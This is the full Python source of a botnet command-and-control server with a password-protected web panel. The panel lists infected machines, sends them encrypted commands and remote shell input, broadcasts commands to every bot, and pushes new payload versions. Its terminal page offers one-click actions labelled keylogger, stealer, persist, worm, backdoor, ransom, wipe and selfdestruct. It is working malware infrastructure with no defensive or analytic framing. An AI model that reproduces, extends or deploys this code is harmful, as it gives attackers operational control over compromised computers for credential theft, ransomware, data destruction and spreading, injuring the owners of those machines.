# c2_server.py
"""
C2 Server — Multi-page + Auth
- Login page (session-based)
- Dashboard, Bots, Terminal, Updates, Settings pages
- All original functionality preserved
"""
import os
import sys
import json
import time
import socket
import base64
import hashlib
import hmac
import secrets
import threading
import urllib.parse
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
from http.cookies import SimpleCookie

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ================== Config ==================
CFG = {
    "bind_host":     "0.0.0.0",
    "bot_port":      5555,
    "web_port":      8000,
    "shared_key":    b"shared_secret_key_32bytes___!!",
    "log_file":      "c2_log.txt",
    "update_dir":    "updates",
    "max_update":    20 * 1024 * 1024,
    # auth
    "admin_user":    "admin",
    "admin_pass":    "admin123",         # غيّرها!
    "session_ttl":   3600 * 8,           # 8 ساعات
    "session_secret": secrets.token_bytes(32),
}

os.makedirs(CFG["update_dir"], exist_ok=True)

# ================== Sessions ==================
SESSIONS = {}      # token -> {"user":..., "created":..., "last":...}
SESSIONS_LOCK = threading.Lock()


def new_session(user):
    token = secrets.token_urlsafe(32)
    now = time.time()
    with SESSIONS_LOCK:
        SESSIONS[token] = {"user": user, "created": now, "last": now}
    return token


def check_session(token):
    if not token:
        return None
    with SESSIONS_LOCK:
        s = SESSIONS.get(token)
        if not s:
            return None
        if time.time() - s["last"] > CFG["session_ttl"]:
            del SESSIONS[token]
            return None
        s["last"] = time.time()
        return s


def drop_session(token):
    with SESSIONS_LOCK:
        SESSIONS.pop(token, None)


# ================== State ==================
class Bot:
    def __init__(self, bot_id, sock, addr, info):
        self.bot_id = bot_id
        self.sock = sock
        self.addr = addr
        self.info = info
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.send_lock = threading.Lock()
        self.version = info.get("version", "?")

    def send(self, obj):
        with self.send_lock:
            try:
                send_msg(self.sock, obj)
                return True
            except OSError:
                return False

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


BOTS = {}
BOTS_LOCK = threading.Lock()
JOBS_LOG = []
JOBS_LOCK = threading.Lock()
JOB_COUNTER = [0]


def log(msg):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)
    try:
        with open(CFG["log_file"], "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


def new_job_id():
    with JOBS_LOCK:
        JOB_COUNTER[0] += 1
        return f"j{JOB_COUNTER[0]:06d}"


# ================== Crypto ==================
def encrypt(plain):
    key = CFG["shared_key"][:32]
    iv = os.urandom(12)
    c = Cipher(algorithms.ChaCha20(key, iv), mode=None,
               backend=default_backend())
    e = c.encryptor()
    return iv + e.update(plain) + e.finalize()


def decrypt(blob):
    key = CFG["shared_key"][:32]
    if len(blob) < 12:
        return b""
    iv, ct = blob[:12], blob[12:]
    c = Cipher(algorithms.ChaCha20(key, iv), mode=None,
               backend=default_backend())
    d = c.decryptor()
    return d.update(ct) + d.finalize()


def send_msg(sock, obj):
    raw = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    enc = encrypt(raw)
    sock.sendall(len(enc).to_bytes(4, "big") + enc)


def recv_msg(sock, timeout=5.0):
    sock.settimeout(timeout)
    try:
        hdr = _recv_exact(sock, 4)
        if not hdr:
            return None
        length = int.from_bytes(hdr, "big")
        if length <= 0 or length > CFG["max_update"] * 2:
            return None
        body = _recv_exact(sock, length)
        if not body:
            return None
        return json.loads(decrypt(body).decode("utf-8"))
    except (socket.timeout, json.JSONDecodeError, OSError):
        return None


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except socket.timeout:
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


# ================== Bot logic ==================
def handle_bot(conn, addr):
    hello = recv_msg(conn, timeout=10)
    if not hello or hello.get("type") != "hello":
        conn.close()
        return
    bot_id = hello.get("bot_id", "unknown")
    info = hello.get("info", {})
    bot = Bot(bot_id, conn, addr, info)
    with BOTS_LOCK:
        old = BOTS.get(bot_id)
        if old:
            try: old.close()
            except Exception: pass
        BOTS[bot_id] = bot
    log(f"bot: {bot_id} @ {addr[0]} v{bot.version}")
    send_msg(conn, {"type": "welcome", "bot_id": bot_id,
                    "server_time": time.time()})
    try:
        while True:
            msg = recv_msg(conn, timeout=90)
            if not msg:
                break
            bot.last_seen = time.time()
            if msg.get("type") == "result":
                with JOBS_LOCK:
                    for j in JOBS_LOG:
                        if j.get("job_id") == msg.get("job_id"):
                            j["result"] = msg.get("result", {})
                            j["ts_done"] = time.time()
                            break
                log(f"[{bot_id}] {msg.get('cmd')} done")
            elif msg.get("type") == "update_ack":
                log(f"[{bot_id}] update: {msg.get('status')}")
    except Exception as e:
        log(f"bot {bot_id} err: {e}")
    finally:
        bot.close()
        with BOTS_LOCK:
            if BOTS.get(bot_id) is bot:
                del BOTS[bot_id]
        log(f"disconnected: {bot_id}")


def send_command(bot_id, cmd_name, args=None):
    args = args or {}
    with BOTS_LOCK:
        bot = BOTS.get(bot_id)
    if not bot:
        return None
    jid = new_job_id()
    if not bot.send({"type": "command", "cmd": cmd_name,
                     "args": args, "job_id": jid}):
        return None
    with JOBS_LOCK:
        JOBS_LOG.append({"job_id": jid, "bot_id": bot_id,
                         "cmd": cmd_name, "args": args,
                         "ts": time.time(), "result": None})
        if len(JOBS_LOG) > 2000:
            JOBS_LOG.pop(0)
    return jid


def broadcast_command(cmd_name, args=None):
    with BOTS_LOCK:
        ids = list(BOTS.keys())
    return {bid: send_command(bid, cmd_name, args) for bid in ids}


def list_bots():
    out = []
    now = time.time()
    with BOTS_LOCK:
        for bid, bot in BOTS.items():
            out.append({
                "bot_id": bid, "host": bot.info.get("host"),
                "os": bot.info.get("os"), "arch": bot.info.get("arch"),
                "user": bot.info.get("user"), "version": bot.version,
                "addr": bot.addr[0],
                "last_seen": int(now - bot.last_seen),
                "uptime": int(now - bot.connected_at),
            })
    return out


def get_jobs(bot_id=None, limit=50):
    with JOBS_LOCK:
        jobs = [j for j in JOBS_LOG if not bot_id or j["bot_id"] == bot_id]
    return list(reversed(jobs[-limit:]))


def push_update(bot_id, source_path, new_version=None):
    if not os.path.exists(source_path):
        return {"ok": False, "err": "source not found"}
    size = os.path.getsize(source_path)
    if size > CFG["max_update"]:
        return {"ok": False, "err": "too large"}
    with open(source_path, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    sha = hashlib.sha256(data).hexdigest()
    version = new_version or f"v{int(time.time())}"
    jid = new_job_id()
    with BOTS_LOCK:
        bot = BOTS.get(bot_id)
    if not bot:
        return {"ok": False, "err": "bot not found"}
    if not bot.send({"type": "update", "job_id": jid,
                     "version": version, "sha256": sha, "b64": b64}):
        return {"ok": False, "err": "send failed"}
    log(f"update -> {bot_id}: {version}")
    return {"ok": True, "version": version}


def push_update_all(source_path, new_version=None):
    with BOTS_LOCK:
        ids = list(BOTS.keys())
    return {bid: push_update(bid, source_path, new_version) for bid in ids}


# ================== HTML templates ==================
CSS = """
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: ui-monospace, Consolas, monospace; background: #0a0a0c;
       color: #d8d8d8; min-height: 100vh; }
a { color: #7ee0a0; text-decoration: none; }
.top { background: #111114; padding: 12px 24px;
       border-bottom: 1px solid #222226;
       display: flex; justify-content: space-between; align-items: center; }
.top h1 { font-size: 15px; color: #7ee0a0; }
.top nav { display: flex; gap: 4px; }
.top nav a { padding: 6px 14px; border-radius: 4px; font-size: 12px;
             color: #999; }
.top nav a:hover { background: #1a1a1e; color: #d8d8d8; }
.top nav a.active { background: #1e2a22; color: #7ee0a0; }
.top .right { font-size: 11px; color: #666; display: flex; gap: 12px; align-items: center; }
.top .right a { padding: 4px 10px; background: #2a1e1e; color: #ff8888;
                border-radius: 4px; }
.container { padding: 20px 24px; max-width: 1400px; margin: 0 auto; }
h2 { font-size: 13px; color: #888; text-transform: uppercase;
     letter-spacing: 1px; margin: 16px 0 10px; }
.card { background: #141418; border: 1px solid #1e1e22;
        border-radius: 8px; padding: 16px; margin-bottom: 12px; }
.grid { display: grid; gap: 12px; }
.grid-2 { grid-template-columns: 1fr 1fr; }
.grid-3 { grid-template-columns: repeat(3, 1fr); }
.grid-4 { grid-template-columns: repeat(4, 1fr); }
.stat { background: #141418; border: 1px solid #1e1e22;
        border-radius: 8px; padding: 16px; }
.stat .num { font-size: 28px; color: #7ee0a0; font-weight: bold; }
.stat .lbl { font-size: 11px; color: #666; margin-top: 4px; }
button, .btn { background: #1a1a1e; color: #d8d8d8;
               border: 1px solid #2a2a2e; padding: 6px 12px;
               border-radius: 4px; font: inherit; font-size: 12px;
               cursor: pointer; }
button:hover { background: #222226; color: #7ee0a0; }
.btn-primary { background: #7ee0a0; color: #0a0a0c; border: none;
               font-weight: bold; }
.btn-primary:hover { background: #6bcb8d; color: #0a0a0c; }
.btn-danger { color: #ff8888; }
.btn-danger:hover { background: #2a1e1e; }
.btn-update { color: #ffcc44; border-color: #4a3a1a; }
.btn-update:hover { background: #2a2410; }
input, select, textarea { background: #060608; color: #d8d8d8;
                          border: 1px solid #2a2a2e; border-radius: 4px;
                          padding: 8px 12px; font: inherit; font-size: 12px; }
input:focus, select:focus, textarea:focus { outline: none; border-color: #7ee0a0; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
th { text-align: left; color: #666; font-size: 11px;
     text-transform: uppercase; padding: 8px 10px;
     border-bottom: 1px solid #1e1e22; font-weight: normal; }
td { padding: 10px; border-bottom: 1px solid #1a1a1e; }
tr:hover td { background: #111114; }
tr.clickable { cursor: pointer; }
.mono { font-family: ui-monospace, Consolas, monospace; }
.muted { color: #666; }
.ok { color: #7ee0a0; }
.err { color: #ff6b6b; }
.warn { color: #ffcc44; }
.term { background: #060608; border: 1px solid #1e1e22;
        border-radius: 6px; padding: 14px; font-size: 12px;
        line-height: 1.5; min-height: 400px; max-height: 70vh;
        overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
.term .ts { color: #444; }
.term .cmd { color: #7ec0ff; }
.term .out { color: #999; padding-left: 20px; }
.term .err-l { color: #ff6b6b; padding-left: 20px; }
.term .ok-l { color: #7ee0a0; }
.row { display: flex; gap: 8px; align-items: center; }
.login-wrap { display: flex; justify-content: center; align-items: center;
              min-height: 100vh; padding: 20px; }
.login-box { background: #141418; border: 1px solid #1e1e22;
             border-radius: 10px; padding: 32px; width: 340px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
.login-box h1 { color: #7ee0a0; font-size: 18px; margin-bottom: 6px; }
.login-box p { color: #666; font-size: 12px; margin-bottom: 24px; }
.login-box label { display: block; font-size: 11px; color: #888;
                   margin: 14px 0 6px; }
.login-box input { width: 100%; }
.login-box button { width: 100%; margin-top: 20px; padding: 10px;
                    background: #7ee0a0; color: #0a0a0c; border: none;
                    border-radius: 4px; font-weight: bold; }
.login-box .error { color: #ff6b6b; font-size: 12px;
                    margin-top: 12px; text-align: center; }
.badge { display: inline-block; font-size: 9px; padding: 2px 6px;
         border-radius: 3px; background: #1e1e22; color: #888;
         margin-left: 4px; }
"""


def page_shell(active, user, body, title="C2"):
    nav = ""
    pages = [("dashboard", "Dashboard"), ("bots", "Bots"),
             ("terminal", "Terminal"), ("jobs", "Jobs"),
             ("updates", "Updates"), ("settings", "Settings")]
    for slug, label in pages:
        cls = ' class="active"' if slug == active else ""
        nav += f'<a href="/{slug}"{cls}>{label}</a>'
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>{title}</title>
<style>{CSS}</style></head><body>
<div class="top">
  <h1>C2 Control</h1>
  <nav>{nav}</nav>
  <div class="right">
    <span>{user}</span>
    <a href="/logout">logout</a>
  </div>
</div>
<div class="container">{body}</div>
</body></html>"""


def login_page(error=""):
    err = f'<div class="error">{error}</div>' if error else ""
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Login</title>
<style>{CSS}</style></head><body>
<div class="login-wrap"><div class="login-box">
  <h1>C2 Control</h1>
  <p>sign in to continue</p>
  <form method="POST" action="/login">
    <label>Username</label>
    <input name="user" autofocus required>
    <label>Password</label>
    <input name="pass" type="password" required>
    <button type="submit">Sign In</button>
    {err}
  </form>
</div></div></body></html>"""


def page_dashboard(user):
    bots = list_bots()
    total = len(bots)
    online = sum(1 for b in bots if b["last_seen"] < 60)
    jobs = get_jobs(limit=1000)
    total_jobs = len(jobs)
    pending = sum(1 for j in jobs if j["result"] is None)
    versions = {}
    for b in bots:
        versions[b["version"]] = versions.get(b["version"], 0) + 1
    vlist = "".join(
        f'<div class="row" style="justify-content:space-between;padding:4px 0">'
        f'<span>{v}</span><span class="muted">{n}</span></div>'
        for v, n in versions.items())
    recent = jobs[:5]
    rrows = ""
    for j in recent:
        status = "pending" if j["result"] is None else ("ok" if j["result"].get("ok") else "err")
        cls = {"pending": "warn", "ok": "ok", "err": "err"}[status]
        rrows += (f'<tr><td class="mono">{j["job_id"]}</td>'
                  f'<td>{j["bot_id"][:12]}</td>'
                  f'<td class="mono">{j["cmd"]}</td>'
                  f'<td class="{cls}">{status}</td></tr>')
    body = f"""
    <h2>Overview</h2>
    <div class="grid grid-4">
      <div class="stat"><div class="num">{total}</div><div class="lbl">total bots</div></div>
      <div class="stat"><div class="num ok">{online}</div><div class="lbl">online now</div></div>
      <div class="stat"><div class="num">{total_jobs}</div><div class="lbl">total jobs</div></div>
      <div class="stat"><div class="num warn">{pending}</div><div class="lbl">pending</div></div>
    </div>
    <div class="grid grid-2" style="margin-top:12px">
      <div class="card">
        <h2>Versions</h2>
        {vlist or '<div class="muted">no bots</div>'}
      </div>
      <div class="card">
        <h2>Recent Jobs</h2>
        <table>
          <tr><th>job</th><th>bot</th><th>cmd</th><th>status</th></tr>
          {rrows or '<tr><td colspan="4" class="muted">no jobs</td></tr>'}
        </table>
      </div>
    </div>
    <h2>Quick Actions</h2>
    <div class="card row" style="flex-wrap:wrap">
      <a href="/bots" class="btn">Manage bots</a>
      <a href="/terminal" class="btn">Open terminal</a>
      <a href="/updates" class="btn btn-update">Push update</a>
    </div>
    """
    return page_shell("dashboard", user, body, "Dashboard")


def page_bots(user):
    bots = list_bots()
    rows = ""
    for b in bots:
        state = "ok" if b["last_seen"] < 60 else "muted"
        rows += f"""<tr class="clickable" onclick="window.location='/terminal?bot={b['bot_id']}'">
        <td class="mono">{b['bot_id'][:12]}</td>
        <td>{b['host'] or '?'}</td>
        <td>{b['os'] or '?'}</td>
        <td>{b['user'] or '?'}</td>
        <td class="mono">{b['version']}</td>
        <td>{b['addr']}</td>
        <td class="{state}">{b['last_seen']}s</td>
        <td>{b['uptime']}s</td>
        </tr>"""
    body = f"""
    <h2>Bots ({len(bots)})</h2>
    <div class="card">
      <table>
        <tr><th>id</th><th>host</th><th>os</th><th>user</th>
        <th>ver</th><th>ip</th><th>seen</th><th>up</th></tr>
        {rows or '<tr><td colspan="8" class="muted">no bots connected</td></tr>'}
      </table>
    </div>
    """
    return page_shell("bots", user, body, "Bots")


def page_terminal(user):
    bots = list_bots()
    opts = "".join(
        f'<option value="{b["bot_id"]}">{b["bot_id"][:12]} '
        f'({b["host"] or "?"})</option>' for b in bots)
    body = f"""
    <h2>Terminal</h2>
    <div class="card">
      <div class="row" style="margin-bottom:12px">
        <select id="selBot" style="flex:1">
          <option value="">-- select a bot --</option>
          {opts}
        </select>
        <button onclick="refresh()">refresh</button>
        <button onclick="clearTerm()">clear</button>
      </div>
      <div class="row" style="flex-wrap:wrap;margin-bottom:12px;gap:4px">
        <button onclick="q('info')">info</button>
        <button onclick="q('ps')">ps</button>
        <button onclick="q('screenshot')">screen</button>
        <button onclick="q('keylogger')">keylog on</button>
        <button onclick="q('stopkeylog')">keylog off</button>
        <button onclick="q('keydump')">keydump</button>
        <button onclick="q('stealer')">stealer</button>
        <button onclick="q('persist')">persist</button>
        <button onclick="q('worm')">worm</button>
        <button onclick="q('backdoor')">backdoor</button>
        <button onclick="q('lock')">lock</button>
        <button class="btn-danger" onclick="danger('ransom')">ransom</button>
        <button class="btn-danger" onclick="danger('wipe')">wipe</button>
        <button class="btn-danger" onclick="danger('selfdestruct')">kill</button>
      </div>
      <div class="row" style="margin-bottom:12px">
        <input id="cmd" placeholder="shell command..." style="flex:1"
               onkeydown="if(event.key==='Enter')sendShell()">
        <button class="btn-primary" onclick="sendShell()">Send</button>
      </div>
      <div class="term" id="term"></div>
    </div>
    <script>
    const term = document.getElementById('term');
    const sel = document.getElementById('selBot');
    const qs = new URLSearchParams(location.search);
    if (qs.get('bot')) sel.value = qs.get('bot');
    let shown = new Set();

    function esc(s) {{
      return String(s).replace(/[&<>"']/g, c => ({{
        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
      }}[c]));
    }}
    function ts() {{ return new Date().toLocaleTimeString(); }}
    function addLine(html, cls) {{
      const d = document.createElement('div');
      d.className = cls || '';
      d.innerHTML = html;
      term.appendChild(d);
      term.scrollTop = term.scrollHeight;
    }}
    function clearTerm() {{ term.innerHTML = ''; shown.clear(); }}

    async function q(cmd, args) {{
      const bot = sel.value;
      if (!bot) {{ alert('select a bot'); return; }}
      addLine(`<span class="ts">[${{ts()}}]</span> > ${{esc(cmd)}}`, 'cmd');
      let body = `cmd=${{cmd}}&bot_id=${{encodeURIComponent(bot)}}`;
      if (args) body += `&args=${{encodeURIComponent(JSON.stringify(args))}}`;
      await fetch('/api/cmd', {{
        method:'POST',
        headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
        body
      }});
      setTimeout(poll, 500);
    }}
    function danger(cmd) {{
      if (!confirm('Run ' + cmd + '?')) return;
      q(cmd);
    }}
    async function sendShell() {{
      const bot = sel.value;
      if (!bot) {{ alert('select a bot'); return; }}
      const i = document.getElementById('cmd');
      const v = i.value.trim();
      if (!v) return;
      i.value = '';
      addLine(`<span class="ts">[${{ts()}}]</span> $ ${{esc(v)}}`, 'cmd');
      const body = `cmd=shell&args=${{encodeURIComponent(JSON.stringify({{cmd:v}}))}}&bot_id=${{encodeURIComponent(bot)}}`;
      await fetch('/api/cmd', {{
        method:'POST',
        headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
        body
      }});
      setTimeout(poll, 700);
    }}
    async function poll() {{
      const bot = sel.value;
      if (!bot) return;
      const r = await fetch('/api/jobs?bot_id=' + encodeURIComponent(bot) + '&limit=10');
      const jobs = await r.json();
      for (const j of jobs) {{
        if (shown.has(j.job_id)) continue;
        shown.add(j.job_id);
        if (j.result === null) continue;
        const res = j.result;
        const out = res.out || res.info || res.items || res.note ||
                    res.err || res.stolen || res.copied || res.b64 ||
                    JSON.stringify(res);
        addLine(`<span class="ts">[${{ts()}}]</span> ${{j.cmd}} <span class="badge">${{j.job_id}}</span>`,
                res.ok ? 'ok-l' : 'err-l');
        if (typeof out === 'string') {{
          addLine(esc(out.slice(0, 3000)), res.ok ? 'out' : 'err-l');
        }} else {{
          addLine(esc(JSON.stringify(out, null, 2).slice(0, 3000)),
                  res.ok ? 'out' : 'err-l');
        }}
      }}
    }}
    sel.addEventListener('change', () => {{ clearTerm(); poll(); }});
    setInterval(poll, 1500);
    </script>
    """
    return page_shell("terminal", user, body, "Terminal")


def page_jobs(user):
    jobs = get_jobs(limit=200)
    rows = ""
    for j in jobs:
        res = j["result"]
        if res is None:
            status, cls, out = "pending", "warn", ""
        elif res.get("ok"):
            status, cls = "ok", "ok"
            out = res.get("out", "")
        else:
            status, cls = "error", "err"
            out = res.get("err", "")
        out = str(out)[:100].replace("\n", " ")
        rows += (f'<tr><td class="mono">{j["job_id"]}</td>'
                 f'<td>{j["bot_id"][:12]}</td>'
                 f'<td class="mono">{j["cmd"]}</td>'
                 f'<td class="{cls}">{status}</td>'
                 f'<td class="muted mono">{out}</td></tr>')
    body = f"""
    <h2>Job History</h2>
    <div class="card">
      <table>
        <tr><th>job</th><th>bot</th><th>cmd</th><th>status</th><th>result</th></tr>
        {rows or '<tr><td colspan="5" class="muted">no jobs</td></tr>'}
      </table>
    </div>
    """
    return page_shell("jobs", user, body, "Jobs")


def page_updates(user):
    files = []
    for f in sorted(os.listdir(CFG["update_dir"])):
        full = os.path.join(CFG["update_dir"], f)
        if os.path.isfile(full):
            files.append((f, os.path.getsize(full)))
    frows = "".join(
        f'<tr><td class="mono">{n}</td><td>{s}b</td></tr>'
        for n, s in files)
    bots = list_bots()
    opts = "".join(
        f'<option value="{b["bot_id"]}">{b["bot_id"][:12]} '
        f'({b["host"] or "?"})</option>' for b in bots)
    body = f"""
    <h2>Update Files</h2>
    <div class="card">
      <table>
        <tr><th>file</th><th>size</th></tr>
        {frows or '<tr><td colspan="2" class="muted">no files in updates/</td></tr>'}
      </table>
    </div>
    <h2>Push Update</h2>
    <div class="card">
      <label style="font-size:11px;color:#888;display:block;margin-bottom:6px">source file</label>
      <input id="path" placeholder="client_v2.py" style="width:100%">
      <label style="font-size:11px;color:#888;display:block;margin:12px 0 6px">version</label>
      <input id="ver" placeholder="v2.0" style="width:100%">
      <label style="font-size:11px;color:#888;display:block;margin:12px 0 6px">target</label>
      <select id="target" style="width:100%">
        <option value="__all__">All bots ({len(bots)})</option>
        {opts}
      </select>
      <div style="margin-top:16px">
        <button class="btn-update" onclick="push()">Push Update</button>
      </div>
    </div>
    <script>
    async function push() {{
      const path = document.getElementById('path').value.trim();
      const ver = document.getElementById('ver').value.trim();
      const target = document.getElementById('target').value;
      if (!path) {{ alert('enter file name'); return; }}
      const body = `path=${{encodeURIComponent(path)}}&version=${{encodeURIComponent(ver)}}`;
      let url = target === '__all__'
        ? '/api/update_all'
        : `/api/update?bot_id=${{encodeURIComponent(target)}}`;
      const r = await fetch(url, {{
        method:'POST',
        headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
        body
      }});
      const data = await r.json();
      alert(JSON.stringify(data, null, 2));
    }}
    </script>
    """
    return page_shell("updates", user, body, "Updates")


def page_settings(user):
    body = f"""
    <h2>Server Info</h2>
    <div class="card">
      <table>
        <tr><td>Bind host</td><td class="mono">{CFG['bind_host']}</td></tr>
        <tr><td>Bot port</td><td class="mono">{CFG['bot_port']}</td></tr>
        <tr><td>Web port</td><td class="mono">{CFG['web_port']}</td></tr>
        <tr><td>Session TTL</td><td class="mono">{CFG['session_ttl']}s</td></tr>
        <tr><td>Max update size</td><td class="mono">{CFG['max_update']} bytes</td></tr>
        <tr><td>Update dir</td><td class="mono">{os.path.abspath(CFG['update_dir'])}</td></tr>
        <tr><td>Log file</td><td class="mono">{os.path.abspath(CFG['log_file'])}</td></tr>
      </table>
    </div>
    <h2>Security</h2>
    <div class="card">
      <p class="muted" style="font-size:12px;margin-bottom:12px">
        To change admin credentials edit CFG in c2_server.py.
        Active sessions: {len(SESSIONS)}
      </p>
      <form method="POST" action="/settings/logout_all">
        <button class="btn-danger" type="submit">Logout all sessions</button>
      </form>
    </div>
    """
    return page_shell("settings", user, body, "Settings")


# ================== HTTP handler ==================
PUBLIC_PATHS = ("/login", "/logout")
API_PATHS = ("/api/bots", "/api/jobs", "/api/cmd",
             "/api/update", "/api/update_all", "/api/updates")


class WebHandler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="text/html; charset=utf-8", headers=None):
        self.send_response(code)
        self.send_header("Content-type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        if headers:
            for k, v in headers.items():
                self.send_header(k, v)
        self.end_headers()
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.wfile.write(body)

    def _json(self, code, obj):
        self._send(code, json.dumps(obj, ensure_ascii=False),
                   "application/json; charset=utf-8")

    def _redirect(self, location, cookies=None):
        headers = {"Location": location}
        self.send_response(302)
        self.send_header("Location", location)
        if cookies:
            for c in cookies:
                self.send_header("Set-Cookie", c)
        self.end_headers()

    def _session_token(self):
        cookie = SimpleCookie(self.headers.get("Cookie", ""))
        if "sid" in cookie:
            return cookie["sid"].value
        return None

    def _current_user(self):
        tok = self._session_token()
        s = check_session(tok)
        return s["user"] if s else None

    def _require_auth(self):
        user = self._current_user()
        if not user:
            self._redirect("/login")
            return None
        return user

    def _parse_body(self):
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length).decode("utf-8", errors="ignore")

    # ----- GET -----
    def do_GET(self):
        p = urlparse(self.path)
        path = p.path

        if path == "/login":
            return self._send(200, login_page())
        if path == "/logout":
            tok = self._session_token()
            if tok:
                drop_session(tok)
            return self._redirect("/login",
                                  ["sid=; Max-Age=0; Path=/; HttpOnly"])

        user = self._require_auth()
        if not user:
            return

        if path in ("/", "/dashboard"):
            return self._send(200, page_dashboard(user))
        if path == "/bots":
            return self._send(200, page_bots(user))
        if path == "/terminal":
            return self._send(200, page_terminal(user))
        if path == "/jobs":
            return self._send(200, page_jobs(user))
        if path == "/updates":
            return self._send(200, page_updates(user))
        if path == "/settings":
            return self._send(200, page_settings(user))

        # APIs
        if path == "/api/bots":
            return self._json(200, list_bots())
        if path == "/api/jobs":
            q = parse_qs(p.query)
            bid = q.get("bot_id", [None])[0]
            lim = int(q.get("limit", ["50"])[0])
            return self._json(200, get_jobs(bid, lim))
        if path == "/api/updates":
            files = []
            for f in sorted(os.listdir(CFG["update_dir"])):
                full = os.path.join(CFG["update_dir"], f)
                if os.path.isfile(full):
                    files.append({"name": f, "size": os.path.getsize(full),
                                  "mtime": int(os.path.getmtime(full))})
            return self._json(200, files)

        return self._send(404, "<h1>404</h1><a href='/'>home</a>")

    # ----- POST -----
    def do_POST(self):
        p = urlparse(self.path)
        path = p.path
        raw = self._parse_body()
        params = parse_qs(raw)

        # login
        if path == "/login":
            user = params.get("user", [""])[0]
            pw = params.get("pass", [""])[0]
            if (hmac.compare_digest(user, CFG["admin_user"]) and
                    hmac.compare_digest(pw, CFG["admin_pass"])):
                tok = new_session(user)
                cookie = f"sid={tok}; Path=/; HttpOnly; Max-Age={CFG['session_ttl']}"
                return self._redirect("/dashboard", [cookie])
            return self._send(200, login_page("Invalid credentials"))

        # require auth for the rest
        user = self._require_auth()
        if not user:
            return

        if path == "/settings/logout_all":
            with SESSIONS_LOCK:
                SESSIONS.clear()
            return self._redirect("/login",
                                  ["sid=; Max-Age=0; Path=/; HttpOnly"])

        if path == "/api/cmd":
            cmd = params.get("cmd", [""])[0]
            args_raw = params.get("args", ["{}"])[0]
            try:
                args = json.loads(args_raw) if args_raw else {}
            except json.JSONDecodeError:
                args = {}
            if params.get("broadcast", [""])[0] == "1":
                return self._json(200, {"broadcast": broadcast_command(cmd, args)})
            bot_id = params.get("bot_id", [""])[0]
            if not bot_id:
                return self._json(400, {"error": "missing bot_id"})
            jid = send_command(bot_id, cmd, args)
            if not jid:
                return self._json(404, {"error": "bot not found"})
            return self._json(200, {"job_id": jid})

        if path == "/api/update":
            bot_id = parse_qs(p.query).get("bot_id", [""])[0]
            fpath = params.get("path", [""])[0]
            ver = params.get("version", [""])[0] or None
            if not bot_id:
                return self._json(400, {"error": "missing bot_id"})
            if not os.path.isabs(fpath):
                fpath = os.path.join(CFG["update_dir"], fpath)
            return self._json(200, push_update(bot_id, fpath, ver))

        if path == "/api/update_all":
            fpath = params.get("path", [""])[0]
            ver = params.get("version", [""])[0] or None
            if not fpath:
                return self._json(400, {"error": "missing path"})
            if not os.path.isabs(fpath):
                fpath = os.path.join(CFG["update_dir"], fpath)
            return self._json(200, {"broadcast": push_update_all(fpath, ver)})

        return self._json(404, {"error": "not found"})

    def log_message(self, *args):
        pass


# ================== Bot listener ==================
def bot_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((CFG["bind_host"], CFG["bot_port"]))
    s.listen(100)
    log(f"bot listener: {CFG['bind_host']}:{CFG['bot_port']}")
    while True:
        try:
            conn, addr = s.accept()
        except OSError:
            break
        threading.Thread(target=handle_bot, args=(conn, addr),
                         daemon=True).start()


# ================== Main ==================
def main():
    print("=" * 55)
    print("  C2 Server")
    print("=" * 55)
    print(f"  web:     http://127.0.0.1:{CFG['web_port']}")
    print(f"  login:   {CFG['admin_user']} / {CFG['admin_pass']}")
    print(f"  bots:    {CFG['bind_host']}:{CFG['bot_port']}")
    print(f"  updates: {CFG['update_dir']}/")
    print("=" * 55)

    threading.Thread(target=bot_listener, daemon=True).start()

    web = HTTPServer(("0.0.0.0", CFG["web_port"]), WebHandler)
    try:
        web.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] shutdown")
        with BOTS_LOCK:
            for bot in BOTS.values():
                bot.send({"type": "shutdown"})
                bot.close()


if __name__ == "__main__":
    main()